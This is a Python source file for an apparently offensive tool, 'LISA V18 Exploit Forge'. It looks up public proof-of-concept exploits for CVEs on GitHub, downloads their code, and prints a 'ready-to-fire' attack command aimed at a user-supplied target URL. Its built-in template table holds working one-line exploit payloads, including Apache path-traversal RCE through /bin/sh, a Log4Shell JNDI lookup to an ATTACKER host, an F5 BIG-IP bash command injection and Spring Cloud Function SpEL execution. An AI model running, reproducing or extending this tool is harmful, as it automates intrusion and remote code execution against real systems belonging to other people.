#!/usr/bin/env python3
"""
LISA V18 EXEC — "EXPLOIT FORGE" — THE AUTO-POC ENGINE
AI-Driven Exploit Retrieval + Payload Generation — V18

V17 (OMNI: CvePoC + JWT + OAuth + API-Authz + OSINT + Infostealer) + V18 modules:

  NEW IN V18 (EXPLOIT FORGE):
  1.  GhPocScanner     — Live GitHub API search for PoC repos matching a CVE,
                         rate-limit aware, star-ranked, multi-query (CVE ID, product, vendor).
  2.  TreeLister       — Recursive git-tree walk for likely exploit files
                         (*.py/*.sh/*.go/*.pl/*.rb/*.c/*.rs/*.js/*.md) + auto-pick best.
  3.  RawFetcher       — Pull raw exploit source from raw.githubusercontent.com,
                         with polish (strip HTML, cap size, dedupe).
  4.  ExploitForge     — Assemble a consolidated exploit brief: CVE metadata (local DB)
                         + affected versions + PoC code + ready-to-fire command.
                         Builtin payload templates for 20+ headline CVEs (fallback when
                         GitHub rate-limits or no repo found).
  5.  BatchNominate    — Feed a list of CVEs, rank by PoC availability + severity.

USAGE:
  python3 lisa_v8_exec_v18.py --exploit CVE-2025-55182            # fetch + forge full brief
  python3 lisa_v8_exec_v18.py --exploit CVE-2025-55182 --target https://target.com
  python3 lisa_v8_exec_v18.py --scan CVE-2021-41773               # GitHub PoC scan only
  python3 lisa_v8_exec_v18.py --exploit CVE-2021-41773 --cowsay-off  # plain output
  python3 lisa_v8_exec_v18.py --nominate cves.txt                 # rank a list of CVEs
  python3 lisa_v8_exec_v18.py --top-2026                          # top exploit-ready 2026 + auto-scan
"""

import sys, os, json, re, time, random, string, subprocess, hashlib, base64, sqlite3
import urllib.parse, urllib.request, urllib.error
from datetime import datetime
from typing import Optional, List, Dict, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, "/home/ubuntu")

try:
    from lisa_v8_exec_v17 import CvePoCEngine, GITHUB_POC_ARSENAL, GITHUB_TOOL_ARSENAL, V17_SIGNATURE
except Exception:
    CvePoCEngine = None
    GITHUB_POC_ARSENAL = {}
    V17_SIGNATURE = ""

V18_SIGNATURE = """
╔══════════════════════════════════════════════════════════════════╗
║  LISA V18 — EXPLOIT FORGE — THE AUTO-POC ENGINE                  ║
║  GhPocScanner + TreeLister + RawFetcher + ExploitForge           ║
║  "Find the PoC. Pull the code. Forge the payload. Fire."         ║
╚══════════════════════════════════════════════════════════════════╝
"""

GH_API = "https://api.github.com"
UA = {"User-Agent": "lisa-v18-exploit-forge", "Accept": "application/vnd.github+json"}

# ═══════════════════════════════════════════════════════════════════
# Builtin payload templates for headline CVEs (fallback + enrichment)
# ═══════════════════════════════════════════════════════════════════
CVE_TEMPLATES = {
    "CVE-2021-41773": {
        "product": "Apache HTTP Server 2.4.49 (also 2.4.50 via CVE-2021-42013)",
        "impact": "Path traversal + RCE (if mod_cgi enabled)",
        "test": "curl -s --path-as-is 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' --data 'echo;id'",
        "lfi": "curl -s --path-as-is 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'",
    },
    "CVE-2021-42013": {
        "product": "Apache HTTP Server 2.4.50 (incomplete patch of 41773)",
        "impact": "Path traversal + RCE, double-encoded %2e%2e",
        "test": "curl -s --path-as-is 'http://TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh' --data 'echo;id'",
    },
    "CVE-2021-44228": {
        "product": "Apache Log4j 2.0–2.14.1 (Log4Shell)",
        "impact": "JNDI injection → RCE",
        "test": "curl -s 'http://TARGET/x' -H 'X-Api-Version: ${jndi:ldap://ATTACKER/a}'",
        "implant": "log4j-shell-poc / dnslog.cn — ${jndi:ldap://x.dnslog.cn}",
    },
    "CVE-2022-1388": {
        "product": "F5 BIG-IP iControl REST (16.1.x < 16.1.2.2)",
        "impact": "Auth bypass + command injection (RCE)",
        "test": "curl -sk -X POST 'https://TARGET/mgmt/tm/util/bash' -H 'Authorization: Basic YWRtaW46' -H 'X-F5-Auth-Token: a' -H 'Connection: X-F5-Auth-Token, X-Forwarded-Host' -d '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}'",
    },
    "CVE-2022-22963": {
        "product": "Spring Cloud Function 3.x (SpEL RCE)",
        "impact": "Unauth RCE via spring.cloud.function.routing-expression header",
        "test": "curl -sv 'http://TARGET/functionRouter' -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"id\")'",
    },
    "CVE-2022-22965": {
        "product": "Spring Framework 5.3.0–5.3.17 (Spring4Shell)",
        "impact": "RCE via ClassLoader manipulation",
        "test": "POST with class.module.classLoader.* bound as headers (see spring4shell PoC)",
    },
    "CVE-2023-23752": {
        "product": "Joomla 4.0.0–4.2.7 (unauth info leak)",
        "impact": "Unauth access to /api/index.php/v1/config exposes DB creds + user list",
        "test": "curl -s 'http://TARGET/api/index.php/v1/config/application?public=true'",
        "users": "curl -s 'http://TARGET/api/index.php/v1/users?public=true'",
    },
    "CVE-2023-25136": {
        "product": "OpenSSH 9.1 (pre-auth double free)",
        "impact": "Pre-auth memory corruption (hard to weaponize)",
    },
    "CVE-2024-3400": {
        "product": "PAN-OS GlobalProtect 10.2/11.0/11.1 < fixed",
        "impact": "Command injection → root RCE (zero-day, actively exploited)",
        "test": "POST /ssl-vpn/hipreport.esp with Cookie: SESSID=../../../... + command injection",
    },
    "CVE-2024-24919": {
        "product": "Check Point Security Gateway (Info leak → RCE)",
        "impact": "Path traversal reads /etc/shadow + /etc/passwd, then login bypass",
    },
    "CVE-2025-55182": {
        "product": "Next.js 15+/React Server Components + Turbopack (React2Shell)",
        "impact": "Pre-auth RCE via crafted RSC multipart (CVSS 10.0)",
        "note": "WAF (Cloudflare) heavily blocks; authenticated pivot fallback. See lisa-v8 React2Shell section.",
    },
    "CVE-2025-49132": {
        "product": "web-component/tinyrpc .10 (unauth RCE)",
        "test": "POST to /tinyrpc/__rpc with crafted JSON RPC → RCE",
    },
    "CVE-2026-48907": {
        "product": "Joomla JCE editor (unauth RCE, CVSS 10.0)",
        "impact": "Unauth profile import → PHP upload → RCE",
        "test": "POST /index.php?option=com_jce&task=profiles.import with shell XML (see joomla-pentest skill)",
    },
    "CVE-2026-48909": {
        "product": "Joomla SP LMS (com_splms) < 4.1.4",
        "impact": "Unauth PHP object injection (cookie deserialization) → RCE",
    },
    "CVE-2026-23744": {
        "product": "MCPJam Inspector ≤ 1.4.2",
        "impact": "Unauth RCE via crafted MCP server install (listens on 0.0.0.0)",
    },
    "CVE-2026-33017": {
        "product": "Langflow < 1.9.0",
        "impact": "Unauth RCE via POST /api/v1/build_public_tmp/{flow_id}/flow (python exec, no sandbox)",
    },
    "CVE-2026-25895": {
        "product": "FUXA SCADA ≤ 1.2.9",
        "impact": "Unauth path traversal → arbitrary file write → RCE",
    },
    "CVE-2026-7567": {
        "product": "WP Temporary Login ≤ 1.0.0",
        "impact": "Auth bypass → ATO via temp-login-token[]= param array trick",
    },
    "CVE-2026-6815": {
        "product": "Casdoor 3.54.1 (LSFS storage provider)",
        "impact": "Auth file write via path traversal (needs admin)",
    },
    "CVE-2026-33534": {
        "product": "EspoCRM ≤ 9.3.3",
        "impact": "SSRF via octal IPv4 (0177.0.0.1) to bypass internal-host check, /api/v1/Attachment/fromImageUrl",
    },
}

EXPLOIT_EXT = (".py", ".sh", ".go", ".pl", ".rb", ".c", ".rs", ".js", ".php", ".ps1", ".bash")


# ═══════════════════════════════════════════════════════════════════
# GhPocScanner — live GitHub search
# ═══════════════════════════════════════════════════════════════════
class GhPocScanner:
    """Search GitHub for PoC repos by CVE / product / vendor. Rate-limit aware."""

    def __init__(self):
        self.rate_limited = False
        self.rate_reset = 0

    def _get_json(self, url: str, timeout: int = 15):
        if self.rate_limited and time.time() < self.rate_reset:
            return None, {"rate_limited": True}
        req = urllib.request.Request(url, headers=UA)
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                remaining = r.headers.get("X-RateLimit-Remaining")
                if remaining is not None and int(remaining) <= 2:
                    self.rate_limited = True
                    self.rate_reset = time.time() + 60
                return json.loads(r.read().decode("utf-8", "replace")), None
        except urllib.error.HTTPError as e:
            if e.code in (403, 429):
                self.rate_limited = True
                self.rate_reset = time.time() + 60
                try:
                    body = json.loads(e.read().decode("utf-8", "replace"))
                    return None, {"rate_limited": True, "msg": body.get("message", "rate limited")}
                except Exception:
                    return None, {"rate_limited": True, "msg": str(e.code)}
            return None, {"http_error": e.code}
        except Exception as e:
            return None, {"error": str(e)}

    def search_cve(self, cve_id: str, per_page: int = 8) -> List[Dict]:
        queries = [f'"{cve_id.upper()}"', cve_id.upper(), cve_id.lower()]
        repos = []
        seen = set()
        for q in queries:
            if self.rate_limited and time.time() < self.rate_reset:
                break
            url = f"{GH_API}/search/repositories?q={urllib.parse.quote(q)}&sort=stars&per_page={per_page}"
            data, err = self._get_json(url)
            if err:
                continue
            if not data:
                continue
            for item in data.get("items", []):
                fn = item.get("full_name")
                if fn and fn not in seen:
                    seen.add(fn)
                    repos.append({
                        "full_name": fn, "stars": item.get("stargazers_count", 0),
                        "desc": (item.get("description") or "")[:100],
                        "lang": item.get("language"), "default_branch": item.get("default_branch", "main"),
                        "html_url": item.get("html_url"),
                    })
            time.sleep(0.3) if q != queries[-1] else None
        repos.sort(key=lambda r: -r["stars"])
        return repos

    def search_product(self, product: str, limit: int = 5) -> List[Dict]:
        url = f"{GH_API}/search/repositories?q={urllib.parse.quote(product + ' exploit OR poc')}&sort=stars&per_page={limit}"
        data, err = self._get_json(url)
        out = []
        if data and not err:
            for item in data.get("items", []):
                out.append({
                    "full_name": item.get("full_name"), "stars": item.get("stargazers_count", 0),
                    "desc": (item.get("description") or "")[:100],
                    "default_branch": item.get("default_branch", "main"),
                })
        return out


# ═══════════════════════════════════════════════════════════════════
# TreeLister + RawFetcher
# ═══════════════════════════════════════════════════════════════════
class TreeLister:
    """Walk a repo's git tree for likely exploit files."""

    def __init__(self, fetcher=None):
        self.fetcher = fetcher or RawFetcher()

    def list_exploit_files(self, full_name: str, branch: str = "main") -> List[str]:
        url = f"{GH_API}/repos/{full_name}/git/trees/{urllib.parse.quote(branch)}?recursive=1"
        data, err = self.fetcher._get_json(url)
        if not data or err:
            for alt in ("master", "main"):
                if alt == branch:
                    continue
                data, err = self.fetcher._get_json(f"{GH_API}/repos/{full_name}/git/trees/{alt}?recursive=1")
                if data and not err:
                    break
        if not data or err:
            return []
        files = []
        for t in data.get("tree", []):
            p = t.get("path", "")
            if p.lower().endswith(EXPLOIT_EXT):
                files.append(p)
        return files

    def rank(self, files: List[str], cve_id: str = "") -> List[str]:
        """Prefer exploit-ish filenames, then shortest paths."""
        def score(p):
            s = 0
            lp = p.lower()
            if any(k in lp for k in ("exploit", "poc", "cve", "rce", "shell", "bypass")):
                s += 5
            if cve_id.lower() in lp.replace("-", ""):
                s += 3
            if lp.endswith((".py", ".sh", ".go")):
                s += 1
            return s
        return sorted(files, key=lambda p: (-score(p), len(p)))


class RawFetcher:
    """Fetch raw file content from raw.githubusercontent.com."""

    def __init__(self):
        self.rate_limited = False
        self.rate_reset = 0

    def _get_json(self, url, timeout=15):
        req = urllib.request.Request(url, headers=UA)
        try:
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return json.loads(r.read().decode("utf-8", "replace")), None
        except urllib.error.HTTPError as e:
            if e.code in (403, 429):
                self.rate_limited = True
                self.rate_reset = time.time() + 60
            return None, {"http_error": e.code}
        except Exception as e:
            return None, {"error": str(e)}

    def fetch_raw(self, full_name: str, path: str, branch: str = "main", max_bytes: int = 8000) -> str:
        url = f"https://raw.githubusercontent.com/{full_name}/{urllib.parse.quote(branch)}/{urllib.parse.quote(path)}"
        req = urllib.request.Request(url, headers={"User-Agent": "lisa-v18"})
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                raw = r.read()
                if len(raw) > max_bytes:
                    raw = raw[:max_bytes] + b"\n...[truncated, use full repo]"
                return raw.decode("utf-8", "replace")
        except Exception:
            return ""

    def fetch_readme(self, full_name: str, branch: str = "main") -> str:
        for name in ("README.md", "README.MD", "readme.md", "README.rst"):
            c = self.fetch_raw(full_name, name, branch)
            if c:
                return c
        return ""


# ═══════════════════════════════════════════════════════════════════
# ExploitForge — assemble the exploit brief
# ═══════════════════════════════════════════════════════════════════
class ExploitForge:
    def __init__(self):
        self.scanner = GhPocScanner()
        self.tree = TreeLister()
        self.raw = RawFetcher()
        self.cve_meta = None
        if CvePoCEngine:
            try:
                self._cvengine = CvePoCEngine()
            except Exception:
                self._cvengine = None
        else:
            self._cvengine = None

    def _meta(self, cve_id: str) -> Optional[Dict]:
        if self._cvengine:
            try:
                return self._cvengine.lookup(cve_id)
            except Exception:
                return None
        return None

    def forge(self, cve_id: str, target: Optional[str] = None, fetch_code: bool = True,
              max_repos: int = 4, max_files: int = 3):
        cid = cve_id.upper()
        print(V18_SIGNATURE)
        print("═" * 64)

        # 1. Local metadata
        meta = self._meta(cid)
        if meta:
            sev = (meta.get("cvss_severity") or "?").upper()
            print(f"[{cid}]  {sev} {meta.get('cvss_score')}  exploits={meta.get('exploit_count')}")
            d = (meta.get("description") or "").strip()
            if d:
                print(f"  {d}")
            if meta.get("vendor") or meta.get("product"):
                print(f"  vendor={meta.get('vendor','?')}  product={meta.get('product','?')}")
            if meta.get("exploit_refs"):
                for ref in meta.get("exploit_refs").split(";")[:4]:
                    print(f"  ↳ {ref.strip()[:150]}")

        # 2. Builtin template
        tpl = CVE_TEMPLATES.get(cid)
        if tpl:
            print(f"\n[+] Builtin knowledge:")
            print(f"  product: {tpl.get('product')}")
            if tpl.get("impact"):
                print(f"  impact : {tpl['impact']}")
            for k in ("test", "lfi", "users", "implant", "note"):
                if tpl.get(k):
                    print(f"  {k:<6}: {tpl[k]}")

        # 3. GitHub PoC scan
        print(f"\n[+] GitHub PoC scan ({cid})…")
        repos = self.scanner.search_cve(cid)
        if not repos:
            print("  (no repos found, or GitHub rate-limited)")
            prod = (tpl or {}).get("product", "").split(" ")[0] if tpl else ""
            if prod and " " not in prod and len(prod) > 2:
                repos = self.scanner.search_product(prod)
        for r in repos[:max_repos]:
            print(f"  ★{r['stars']:<5} {r['full_name']:<42} [{r.get('lang') or '?'}] {r.get('desc','')[:50]}")
            print(f"         {r['html_url']}")

        # 4. Fetch exploit code from top repo(s)
        if fetch_code and repos:
            print(f"\n[+] Fetching exploit code…")
            fetched = 0
            for r in repos[:max_repos]:
                if self.raw.rate_limited and time.time() < self.raw.rate_reset:
                    print("  (raw fetch rate-limited, stopping)")
                    break
                branch = r.get("default_branch", "main")
                files = self.tree.list_exploit_files(r["full_name"], branch)
                ranked = self.tree.rank(files, cid)[:max_files]
                if not ranked:
                    readme = self.raw.fetch_readme(r["full_name"], branch)
                    if readme:
                        print(f"\n  ───── {r['full_name']}/README ─────")
                        print("  " + readme[:1200].replace("\n", "\n  "))
                        fetched += 1
                    continue
                for p in ranked:
                    code = self.raw.fetch_raw(r["full_name"], p, branch)
                    if code.strip():
                        print(f"\n  ───── {r['full_name']}/{p} ─────")
                        print("  " + code[:2500].replace("\n", "\n  "))
                        fetched += 1
                if fetched >= max_files * 2:
                    break
            if not fetched:
                print("  (no raw code retrievable)")

        # 5. Ready-to-fire summary
        print("\n" + "═" * 64)
        print("[+] READY-TO-FIRE:")
        if tpl and tpl.get("test"):
            cmd = tpl["test"].replace("TARGET", target.rstrip("/") if target else "TARGET")
            print(f"  $ {cmd}")
        if target:
            print(f"  Target: {target}")
        print(f"  More PoCs: https://github.com/search?q={cid}&type=repositories")
        return {"cve": cid, "repos": repos, "template": tpl}


# ═══════════════════════════════════════════════════════════════════
# BatchNominate — rank a list of CVEs
# ═══════════════════════════════════════════════════════════════════
def nominate(cve_list: List[str]):
    print(V18_SIGNATURE)
    print("═" * 64)
    eng = CvePoCEngine() if CvePoCEngine else None
    rows = []
    for cid in cve_list:
        r = {"cve": cid, "sev": "?", "score": 0.0, "exploits": 0, "tpl": bool(CVE_TEMPLATES.get(cid.upper()))}
        if eng:
            m = eng.lookup(cid)
            if m:
                r["sev"] = (m.get("cvss_severity") or "?").upper()
                r["score"] = m.get("cvss_score") or 0.0
                r["exploits"] = m.get("exploit_count") or 0
        rows.append(r)
    rows.sort(key=lambda r: (-r["exploits"], -r["score"]))
    print(f"{'CVE':<20} {'SEV':<9} {'SCORE':>6} {'EXP':>4} {'TPL':>4}")
    for r in rows:
        flag = "🔥" if (r["exploits"] > 0 or r["tpl"]) else " "
        print(f"{flag}{r['cve']:<20} {r['sev']:<9} {r['score']:>6} {r['exploits']:>4} {'yes' if r['tpl'] else '-':>4}")


# ═══════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════
def main():
    import argparse
    p = argparse.ArgumentParser(description="LISA V18 — EXPLOIT FORGE")
    p.add_argument("--exploit", help="CVE-ID to forge a full exploit brief from")
    p.add_argument("--scan", help="GitHub PoC scan only (no local DB / templates)")
    p.add_argument("--target", help="Target URL for ready-to-fire command substitution")
    p.add_argument("--nominate", help="Newline file of CVE IDs to rank")
    p.add_argument("--top-2026", action="store_true", help="Top 2026 exploit-ready CVEs + auto-scan top")
    p.add_argument("--no-fetch", action="store_true", help="Skip raw code fetch (metadata + links only)")
    p.add_argument("--max-repos", type=int, default=4)
    p.add_argument("--max-files", type=int, default=3)

    a = p.parse_args()

    if a.nominate and os.path.exists(a.nominate):
        try:
            cves = [ln.strip() for ln in open(a.nominate) if ln.strip()]
        except Exception as e:
            print(f"[!] {e}")
            return
        nominate(cves)
        return

    if a.top_2026:
        eng = CvePoCEngine() if CvePoCEngine else None
        if eng:
            rows = eng.fresh_year(2026, exploit_only=True, limit=15)
            print(V18_SIGNATURE)
            print("═" * 64)
            print("[+] Top 2026 exploit-ready CVEs (auto-nominated):")
            cves = []
            for r in rows:
                cves.append(r["cve_id"])
            nominate(cves)
            # auto-scan the top severity one
            top = cves[0] if cves else None
            if top:
                print(f"\n[+] Auto-forging top CVE: {top}")
                ExploitForge().forge(top, a.target, fetch_code=not a.no_fetch)
        return

    if a.scan:
        cid = a.scan.upper()
        print(V18_SIGNATURE)
        print("═" * 64)
        repos = GhPocScanner().search_cve(cid)
        print(f"[+] GitHub PoC scan ({cid}): {len(repos)} repos")
        for r in repos[:10]:
            print(f"  ★{r['stars']:<5} {r['full_name']:<42} [{r.get('lang') or '?'}] {r.get('desc','')[:50]}")
            print(f"         {r['html_url']}")
        return

    if a.exploit:
        ExploitForge().forge(a.exploit, a.target, fetch_code=not a.no_fetch,
                             max_repos=a.max_repos, max_files=a.max_files)
        return

    p.print_help()


if __name__ == "__main__":
    main()